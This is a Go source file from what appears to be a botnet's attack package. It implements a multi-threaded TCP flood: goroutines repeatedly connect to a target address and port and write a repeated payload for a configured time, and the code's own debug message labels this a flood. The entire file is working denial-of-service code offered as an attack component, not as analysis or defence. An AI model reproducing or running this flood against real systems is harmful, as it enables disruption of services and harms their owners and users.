package attack

import (
	"bot/lib/utils"
	"fmt"
	"net"
	"strings"
	"time"
)

func NewAttack(DestAddr string, DestPort int, Threads int, Power int, Method *Method, Time int) *Attack {
	c := make(chan bool)

	return &Attack{
		DestAddr: DestAddr,
		DestPort: DestPort,
		Threads:  Threads,
		Payload:  []byte(strings.Repeat(Method.Payload, Method.PayloadSize)),
		Running:  &c,
		Power:    Power,
		Time:     Time,
		Name:     Method.Name,
	}
}

func (a *Attack) Run() {
	utils.Debug(fmt.Sprintf("[*] Running %s flood on %s:%d while %ds", a.Name, a.DestAddr, a.DestPort, a.Time))

	for i := 0; i < a.Threads; i++ {
		go func() {
			for {
				select {
				case <-(*a.Running):
					break
				default:
					Conn, Err := net.Dial("tcp", fmt.Sprintf("%s:%d", a.DestAddr, a.DestPort))

					if Err != nil {
						return
					}

					for i := 0; i < a.Power; i++ {
						Conn.Write(a.Payload)
					}

					Conn.Close()
				}
			}
		}()
	}

	time.Sleep(time.Second * time.Duration(a.Time))

	for i := 0; i < a.Threads; i++ {
		*a.Running <- true
	}

	close(*a.Running)
}
